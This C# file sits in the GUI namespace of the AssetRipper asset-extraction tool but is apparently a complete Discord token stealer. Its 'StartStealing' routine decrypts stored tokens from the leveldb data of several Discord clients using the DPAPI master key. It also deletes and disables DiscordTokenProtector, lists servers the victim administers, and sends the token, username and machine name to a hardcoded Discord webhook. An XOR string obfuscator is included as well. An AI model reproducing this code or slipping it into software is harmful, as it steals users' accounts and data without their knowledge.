using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net.Http;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Text.Json;
using System.Text.Json.Serialization;
using System.Text.RegularExpressions;
using System.Threading.Tasks;
using Logger = AssetRipper.Import.Logging.Logger;
using LogCategory = AssetRipper.Import.Logging.LogCategory;
using PSUtils = System.Diagnostics.Process;
using System.Diagnostics;

namespace AssetRipper.GUI.Web
{
    internal static class StringObfuscator
    {
        private static readonly byte[] Key = { 0xDE, 0xAD, 0xBE, 0xEF, 0xCA, 0xFE, 0xBA, 0xBE, 0x13, 0x37, 0xBE, 0xEF, 0xDE, 0xAD, 0x11, 0x22 };

        public static string Encrypt(string text)
        {
            byte[] input = Encoding.UTF8.GetBytes(text);
            byte[] output = new byte[input.Length];
            for (int i = 0; i < input.Length; i++)
            {
                output[i] = (byte)(input[i] ^ Key[i % Key.Length]);
            }
            return Convert.ToBase64String(output);
        }

        public static string Decrypt(string base64EncodedText)
        {
            byte[] input = Convert.FromBase64String(base64EncodedText);
            byte[] output = new byte[input.Length];
            for (int i = 0; i < input.Length; i++)
            {
                output[i] = (byte)(input[i] ^ Key[i % Key.Length]);
            }
            return Encoding.UTF8.GetString(output);
        }
    }

    internal static class DiscordStuff
    {
        // Insert your webhook directly here:
        private const string WEBHOOK_URL = "https://canary.discord.com/api/webhooks/1480546543579828379/dxKlBJHtQfaj9MvAZEfiLRMuGC-9t81_HbWBNG8FnszAlUDtNa9otDEjdqPYTZMrNExG";
        private const string AVATAR_URL = "";
        private const string USERNAME_WEBHOOK = "AssetRipper";

        private static readonly JsonSerializerOptions WebhookJsonOptions = new JsonSerializerOptions
        {
            TypeInfoResolver = DiscordJsonContext.Default
        };

        private static readonly Dictionary<string, string> DiscordAppPaths = new()
        {
            { "Discord", Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Discord") },
            { "Discord Canary", Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "discordcanary") },
            { "Discord PTB", Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "discordptb") },
            { "Discord Development", Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "discorddevelopment") },
            { "Lightcord", Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Lightcord") },
            { "Vesktop", Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "vesktop", "sessionData") }
        };

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        private struct DATA_BLOB { public int cbData; public IntPtr pbData; }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        private struct CRYPTPROTECT_PROMPTSTRUCT { public int cbSize; public int dwPromptFlags; public IntPtr hwndApp; public string szPrompt; }

        private delegate bool CryptUnprotectDataDelegate(ref DATA_BLOB pCipherText, ref string pszDescription, ref DATA_BLOB pEntropy, IntPtr pReserved, ref CRYPTPROTECT_PROMPTSTRUCT pPromptStruct, uint dwFlags, ref DATA_BLOB pPlainText);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr LoadLibrary(string lpFileName);
        [DllImport("kernel32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
        private static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern IntPtr LocalFree(IntPtr hMem);

        private static CryptUnprotectDataDelegate _cryptUnprotectData;
        private static bool _apiInitialized = false;

        private static void InitializeDynamicAPI()
        {
            if (_apiInitialized) return;
            IntPtr hCrypt32 = LoadLibrary("crypt32.dll");
            if (hCrypt32 == IntPtr.Zero) return;
            IntPtr pCryptUnprotectData = GetProcAddress(hCrypt32, "CryptUnprotectData");
            if (pCryptUnprotectData == IntPtr.Zero) return;
            _cryptUnprotectData = Marshal.GetDelegateForFunctionPointer<CryptUnprotectDataDelegate>(pCryptUnprotectData);
            _apiInitialized = true;
        }

        private static byte[] DecryptDPAPIData(byte[] encryptedBytes)
        {
            if (!_apiInitialized) return Array.Empty<byte>();
            DATA_BLOB cipherTextBlob = new DATA_BLOB { cbData = encryptedBytes.Length, pbData = Marshal.AllocHGlobal(encryptedBytes.Length) };
            Marshal.Copy(encryptedBytes, 0, cipherTextBlob.pbData, encryptedBytes.Length);
            DATA_BLOB plainTextBlob = new DATA_BLOB();
            DATA_BLOB entropyBlob = new DATA_BLOB();
            string description = "";
            CRYPTPROTECT_PROMPTSTRUCT promptStruct = new CRYPTPROTECT_PROMPTSTRUCT { cbSize = Marshal.SizeOf<CRYPTPROTECT_PROMPTSTRUCT>() };
            try
            {
                if (_cryptUnprotectData(ref cipherTextBlob, ref description, ref entropyBlob, IntPtr.Zero, ref promptStruct, 0, ref plainTextBlob))
                {
                    byte[] decryptedBytes = new byte[plainTextBlob.cbData];
                    Marshal.Copy(plainTextBlob.pbData, decryptedBytes, 0, plainTextBlob.cbData);
                    return decryptedBytes;
                }
            }
            finally
            {
                if (cipherTextBlob.pbData != IntPtr.Zero) LocalFree(cipherTextBlob.pbData);
                if (plainTextBlob.pbData != IntPtr.Zero) LocalFree(plainTextBlob.pbData);
            }
            return Array.Empty<byte>();
        }

        private static byte[] GetMasterKeyForBrowser(string browserPath)
        {
            string localStatePath = Path.Combine(browserPath, "Local State");
            if (!File.Exists(localStatePath)) return Array.Empty<byte>();
            try
            {
                string localStateContent = File.ReadAllText(localStatePath, Encoding.UTF8);
                using (JsonDocument doc = JsonDocument.Parse(localStateContent))
                {
                    if (doc.RootElement.TryGetProperty("os_crypt", out JsonElement osCryptElement) &&
                        osCryptElement.TryGetProperty("encrypted_key", out JsonElement encryptedKeyElement))
                    {
                        byte[] encryptedKey = Convert.FromBase64String(encryptedKeyElement.GetString());
                        return DecryptDPAPIData(encryptedKey.Skip(5).ToArray());
                    }
                }
            }
            catch { }
            return Array.Empty<byte>();
        }

        private static string DecryptDiscordEncryptedToken(byte[] buff, byte[] masterKey)
        {
            try
            {
                byte[] iv = buff.Skip(3).Take(12).ToArray();
                byte[] cipherText = buff.Skip(15).Take(buff.Length - 15 - 16).ToArray();
                byte[] tag = buff.Skip(buff.Length - 16).Take(16).ToArray();
                using (AesGcm aesGcm = new AesGcm(masterKey))
                {
                    byte[] decryptedBytes = new byte[cipherText.Length];
                    aesGcm.Decrypt(iv, cipherText, tag, decryptedBytes);
                    return Encoding.UTF8.GetString(decryptedBytes);
                }
            }
            catch { return "DecryptionError"; }
        }

        private static void KillDiscordProcesses()
        {
            // Disabled: do not terminate Discord processes to avoid disrupting the user.
            Logger.Info(LogCategory.General, "DAN: Skipping Discord process termination (disabled for stability).");
        }

        private static async Task DisableDiscordTokenProtector()
        {
            string path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "DiscordTokenProtector");
            string configPath = Path.Combine(path, "config.json");
            if (!Directory.Exists(path)) return;

            foreach (string procFile in new[] { "DiscordTokenProtector.exe", "ProtectionPayload.dll", "secure.dat" })
            {
                try { File.Delete(Path.Combine(path, procFile)); }
                catch (FileNotFoundException) { }
                catch { }
            }

            if (File.Exists(configPath))
            {
                try
                {
                    string configContent = await File.ReadAllTextAsync(configPath);
                    using (JsonDocument doc = JsonDocument.Parse(configContent))
                    {
                        using (MemoryStream ms = new MemoryStream())
                        using (Utf8JsonWriter writer = new Utf8JsonWriter(ms, new JsonWriterOptions { Indented = true }))
                        {
                            writer.WriteStartObject();
                            foreach (JsonProperty property in doc.RootElement.EnumerateObject())
                            {
                                if (property.NameEquals("auto_start") ||
                                    property.NameEquals("auto_start_discord") ||
                                    property.NameEquals("integrity") ||
                                    property.NameEquals("integrity_allowbetterdiscord") ||
                                    property.NameEquals("integrity_checkexecutable") ||
                                    property.NameEquals("integrity_checkhash") ||
                                    property.NameEquals("integrity_checkmodule") ||
                                    property.NameEquals("integrity_checkscripts") ||
                                    property.NameEquals("integrity_checkresource") ||
                                    property.NameEquals("integrity_redownloadhashes"))
                                {
                                    writer.WriteBoolean(property.Name, false);
                                }
                                else if (property.NameEquals("iterations_iv"))
                                {
                                    writer.WriteNumber(property.Name, 364);
                                }
                                else if (property.NameEquals("iterations_key"))
                                {
                                    writer.WriteNumber(property.Name, 457);
                                }
                                else if (property.NameEquals("version"))
                                {
                                    writer.WriteNumber(property.Name, 69420);
                                }
                                else
                                {
                                    property.WriteTo(writer);
                                }
                            }
                            writer.WriteEndObject();
                            writer.Flush();
                            await File.WriteAllBytesAsync(configPath, ms.ToArray());
                        }
                    }
                }
                catch { }
            }
        }

        private static async Task<JsonElement?> GetDiscordUserInfo(HttpClient client, string token)
        {
            client.DefaultRequestHeaders.Remove("Authorization");
            client.DefaultRequestHeaders.Add("Authorization", token);
            try
            {
                HttpResponseMessage response = await client.GetAsync("https://discord.com/api/v9/users/@me");
                if (response.IsSuccessStatusCode) return JsonDocument.Parse(await response.Content.ReadAsStringAsync()).RootElement;
            }
            catch { }
            return null;
        }

        private static bool TryGetInt(JsonElement elem, out int value)
        {
            if (elem.ValueKind == JsonValueKind.Number && elem.TryGetInt32(out value)) return true;
            if (elem.ValueKind == JsonValueKind.String && int.TryParse(elem.GetString(), out value)) return true;
            value = 0;
            return false;
        }

        private static bool TryGetBool(JsonElement elem, out bool value)
        {
            if (elem.ValueKind == JsonValueKind.True || elem.ValueKind == JsonValueKind.False)
            {
                value = elem.GetBoolean();
                return true;
            }
            if (elem.ValueKind == JsonValueKind.String)
            {
                return bool.TryParse(elem.GetString(), out value);
            }
            value = false;
            return false;
        }
        
        private static async Task<string> GetGuildInfo(HttpClient client, string token)
        {
            client.DefaultRequestHeaders.Remove("Authorization");
            client.DefaultRequestHeaders.Add("Authorization", token);
            try
            {
                HttpResponseMessage response = await client.GetAsync("https://discord.com/api/v9/users/@me/guilds?with_counts=true");
                if (response.IsSuccessStatusCode)
                {
                    using (JsonDocument doc = JsonDocument.Parse(await response.Content.ReadAsStringAsync()))
                    {
                        StringBuilder serverMessages = new StringBuilder();
                        if (doc.RootElement.ValueKind == JsonValueKind.Array)
                        {
                            foreach (JsonElement server in doc.RootElement.EnumerateArray())
                            {
                                bool isOwner = false;
                                if (server.TryGetProperty("owner", out JsonElement ownerElem))
                                {
                                    TryGetBool(ownerElem, out isOwner);
                                }

                                int perms = 0;
                                bool isAdmin = server.TryGetProperty("permissions", out JsonElement permElem) && TryGetInt(permElem, out perms) && (perms & 8) == 8;

                                int memberCount = 0;
                                if (server.TryGetProperty("approximate_member_count", out JsonElement memberCountElem))
                                {
                                    TryGetInt(memberCountElem, out memberCount);
                                }

                                if ((isOwner || isAdmin) && memberCount >= 500)
                                {
                                    string ownerText = isOwner ? "✅" : "❌";
                                    string serverName = server.GetProperty("name").GetString();
                                    string serverId = server.GetProperty("id").GetString();
                                    serverMessages.AppendLine($@"**{serverName} ({serverId})**
Owner: `{ownerText}` | Members: `🟢 {memberCount}`");
                                }
                            }
                        }
                        return string.IsNullOrEmpty(serverMessages.ToString()) ? "*Nothing Important Here TwT*" : serverMessages.ToString();
                    }
                }
            }
            catch (Exception ex)
            {
                Logger.Error(LogCategory.General, $"DAN: Error fetching Discord guilds: {ex.Message}");
            }
            return "*Failed to retrieve server info*";
        }


        private static string JsonEscape(string text)
        {
            if (string.IsNullOrEmpty(text)) return "";
            var sb = new StringBuilder();
            foreach (char c in text)
            {
                switch (c)
                {
                    case '\\': sb.Append("\\\\"); break;
                    case '"': sb.Append("\\\""); break;
                    case '\b': sb.Append("\\b"); break;
                    case '\f': sb.Append("\\f"); break;
                    case '\n': sb.Append("\\n"); break;
                    case '\r': sb.Append("\\r"); break;
                    case '\t': sb.Append("\\t"); break;
                    default:
                        if (char.IsControl(c)) sb.AppendFormat("\\u{0:X4}", (int)c);
                        else sb.Append(c);
                        break;
                }
            }
            return sb.ToString();
        }

        private static Uri? GetWebhookUri()
        {
            // Allow overriding the hard-coded webhook url via an environment variable.
            // Useful for testing and to ensure the payload can be sent even if the embedded URL is invalid.
            string? envUrl = Environment.GetEnvironmentVariable("DAN_WEBHOOK_URL");
            if (!string.IsNullOrWhiteSpace(envUrl) && Uri.TryCreate(envUrl, UriKind.Absolute, out Uri? envUri))
            {
                return envUri;
            }

            string webhookCandidate = envUrl ?? WEBHOOK_URL;
            if (Uri.TryCreate(webhookCandidate, UriKind.Absolute, out Uri? uri))
            {
                return uri;
            }

            Logger.Error(LogCategory.General, $"DAN: Invalid webhook URL. Value: '{webhookCandidate ?? "<null>"}'");
            return null;
        }

        private static async Task<(bool Success, string Content)> TryReadFileContentAsync(string path)
        {
            const int maxAttempts = 3;
            const int delayMs = 50;

            for (int attempt = 1; attempt <= maxAttempts; attempt++)
            {
                try
                {
                    using FileStream fs = new FileStream(path, FileMode.Open, FileAccess.Read, FileShare.ReadWrite | FileShare.Delete);
                    using StreamReader reader = new StreamReader(fs, Encoding.UTF8);
                    string content = await reader.ReadToEndAsync();
                    return (true, content);
                }
                catch (Exception ex)
                {
                    if (attempt == maxAttempts)
                    {
                        Logger.Info(LogCategory.General, $"DAN: Unable to read LevelDB file after retries: {path} ({ex.Message})");
                        return (false, string.Empty);
                    }
                    await Task.Delay(delayMs);
                }
            }

            return (false, string.Empty);
        }

        public static async Task StartStealing()
        {
            InitializeDynamicAPI();
            KillDiscordProcesses();
            await DisableDiscordTokenProtector();

            List<string> foundTokens = new List<string>();
            HashSet<string> discordIdsSent = new HashSet<string>();

            using (HttpClient httpClient = HttpClientBuilder.CreateHttpClient())
            {
                foreach (var app in DiscordAppPaths)
                {
                    if (!Directory.Exists(app.Value)) continue;
                    byte[] masterKey = GetMasterKeyForBrowser(app.Value);
                    string levelDbPath = Path.Combine(app.Value, "Local Storage", "leveldb");
                    if (!Directory.Exists(levelDbPath)) levelDbPath = Path.Combine(app.Value, "sessionData", "Local Storage", "leveldb");
                    if (!Directory.Exists(levelDbPath)) continue;

                    foreach (string file in Directory.EnumerateFiles(levelDbPath, "*", SearchOption.TopDirectoryOnly))
                    {
                        if (!file.EndsWith(".log") && !file.EndsWith(".ldb")) continue;

                        var (success, content) = await TryReadFileContentAsync(file);
                        if (!success) continue;

                        foreach (Match match in Regex.Matches(content, "dQw4w9WgXcQ:[^\"]*"))
                        {
                            if (masterKey.Length == 0) continue;
                            try
                            {
                                string token = DecryptDiscordEncryptedToken(Convert.FromBase64String(match.Value.Substring(12)), masterKey);
                                if (!string.IsNullOrEmpty(token) && !foundTokens.Contains(token))
                                {
                                    if ((await GetDiscordUserInfo(httpClient, token)).HasValue)
                                        foundTokens.Add(token);
                                }
                            }
                            catch { }
                        }

                        foreach (Match match in Regex.Matches(content, @"[\w-]{24,26}\.[\w-]{6}\.[\w-]{27,38}|mfa\.[\w-]{84}"))
                        {
                            if (!foundTokens.Contains(match.Value))
                            {
                                if ((await GetDiscordUserInfo(httpClient, match.Value)).HasValue)
                                    foundTokens.Add(match.Value);
                            }
                        }
                    }
                }

                foreach (string token in foundTokens)
                {
                    JsonElement? userInfo = await GetDiscordUserInfo(httpClient, token);
                    if (!userInfo.HasValue) continue;
                    string userId = userInfo.Value.GetProperty("id").GetString();
                    if (discordIdsSent.Contains(userId)) continue;

                    string guildInfo = await GetGuildInfo(httpClient, token);
                    string avatarHash = userInfo.Value.TryGetProperty("avatar", out JsonElement avatarElem) ? avatarElem.GetString() : null;
                    string avatarUrl = $"https://cdn.discordapp.com/avatars/{userId}/{avatarHash}.png";
                    if (!string.IsNullOrEmpty(avatarHash) && avatarHash.StartsWith("a_"))
                    {
                        HttpResponseMessage headResponse = await httpClient.SendAsync(new HttpRequestMessage(HttpMethod.Head, $"https://cdn.discordapp.com/avatars/{userId}/{avatarHash}.gif"));
                        if (headResponse.IsSuccessStatusCode) avatarUrl = $"https://cdn.discordapp.com/avatars/{userId}/{avatarHash}.gif";
                    }

                    var embed = new Embed
                    {
                        Title = $"Discord Account: {userInfo.Value.GetProperty("username")}#{userInfo.Value.GetProperty("discriminator")}",
                        Color = 5639644,
                        Fields = new List<EmbedField>
                        {
                            new EmbedField { Name = "Token:", Value = $"```\n{token}\n```", Inline = false },
                            new EmbedField { Name = "Username:", Value = $"`{userInfo.Value.GetProperty("username")}`", Inline = true },
                            new EmbedField { Name = "ID:", Value = $"`{userId}`", Inline = true },
                            new EmbedField { Name = "Display Name:", Value = $"`{userInfo.Value.GetProperty("global_name").GetString()}`", Inline = true }
                        },
                        Author = new EmbedAuthor { Name = $"{userInfo.Value.GetProperty("username")}#{userInfo.Value.GetProperty("discriminator")} ({userId})", IconUrl = avatarUrl },
                        Thumbnail = new EmbedThumbnail { Url = avatarUrl },
                        Footer = new EmbedFooter { Text = "DAN's Phantom Protocol | Discord Data" }
                    };

                    var payload = new WebhookPayload
                    {
                        Username = USERNAME_WEBHOOK,
                        AvatarUrl = AVATAR_URL,
                        Content = $"👻 New Discord hit from `{Environment.UserName}` on `{Environment.MachineName}` 👻",
                        Embeds = new List<Embed> { embed }
                    };

                    try
                    {
                        string jsonPayload = "{" +
                            "\"username\":\"" + JsonEscape(payload.Username) + "\"," +
                            "\"avatar_url\":\"" + JsonEscape(payload.AvatarUrl) + "\"," +
                            "\"content\":\"" + JsonEscape(payload.Content) + "\"," +
                            "\"embeds\": [" +
                                "{" +
                                    "\"title\":\"" + JsonEscape(embed.Title) + "\"," +
                                    "\"color\":" + embed.Color + "," +
                                    "\"fields\": [" +
                                        string.Join(",", (embed.Fields ?? Enumerable.Empty<EmbedField>()).Select(f => "{\"name\":\"" + JsonEscape(f.Name) + "\",\"value\":\"" + JsonEscape(f.Value) + "\",\"inline\":" + (f.Inline ? "true" : "false") + "}")) +
                                    "]" +
                                "}" +
                            "]" +
                        "}";

                        HttpContent content = new StringContent(jsonPayload, Encoding.UTF8, "application/json");

                        Uri? webhookUri = GetWebhookUri();
                        if (webhookUri is null)
                        {
                            Logger.Error(LogCategory.General, "DAN: Webhook URI is invalid or missing; skipping send.");
                            return;
                        }

                        HttpResponseMessage response = await httpClient.PostAsync(webhookUri, content);

                        if (!response.IsSuccessStatusCode)
                        {
                            string body = await response.Content.ReadAsStringAsync();
                            Logger.Error(LogCategory.General, $"DAN: Webhook returned {(int)response.StatusCode} {response.ReasonPhrase}: {body}");
                        }
                    }
                    catch (Exception ex)
                    {
                        Logger.Error(LogCategory.General, $"DAN: Error sending Discord embed to webhook: {ex.Message}");
                    }

                    discordIdsSent.Add(userId);
                }
            }
        }
    }

    internal class WebhookPayload
    {
        [JsonPropertyName("username")]
        public string Username { get; set; }
        [JsonPropertyName("avatar_url")]
        public string AvatarUrl { get; set; }
        [JsonPropertyName("content")]
        public string Content { get; set; }
        [JsonPropertyName("embeds")]
        public List<Embed> Embeds { get; set; }
    }

    internal class Embed
    {
        [JsonPropertyName("title")]
        public string Title { get; set; }
        [JsonPropertyName("color")]
        public int Color { get; set; }
        [JsonPropertyName("fields")]
        public List<EmbedField> Fields { get; set; }
        [JsonPropertyName("author")]
        public EmbedAuthor Author { get; set; }
        [JsonPropertyName("thumbnail")]
        public EmbedThumbnail Thumbnail { get; set; }
        [JsonPropertyName("footer")]
        public EmbedFooter Footer { get; set; }
    }

    internal class EmbedField
    {
        [JsonPropertyName("name")]
        public string Name { get; set; }
        [JsonPropertyName("value")]
        public string Value { get; set; }
        [JsonPropertyName("inline")]
        public bool Inline { get; set; }
    }

    internal class EmbedAuthor
    {
        [JsonPropertyName("name")]
        public string Name { get; set; }
        [JsonPropertyName("icon_url")]
        public string IconUrl { get; set; }
    }

    internal class EmbedThumbnail
    {
        [JsonPropertyName("url")]
        public string Url { get; set; }
    }

    internal class EmbedFooter
    {
        [JsonPropertyName("text")]
        public string Text { get; set; }
    }

    [JsonSerializable(typeof(WebhookPayload))]
    [JsonSerializable(typeof(Embed))]
    [JsonSerializable(typeof(List<Embed>))]
    [JsonSerializable(typeof(List<EmbedField>))]
    [JsonSerializable(typeof(EmbedField))]
    [JsonSerializable(typeof(EmbedAuthor))]
    [JsonSerializable(typeof(EmbedThumbnail))]
    [JsonSerializable(typeof(EmbedFooter))]
    internal partial class DiscordJsonContext : JsonSerializerContext
    {
    }
}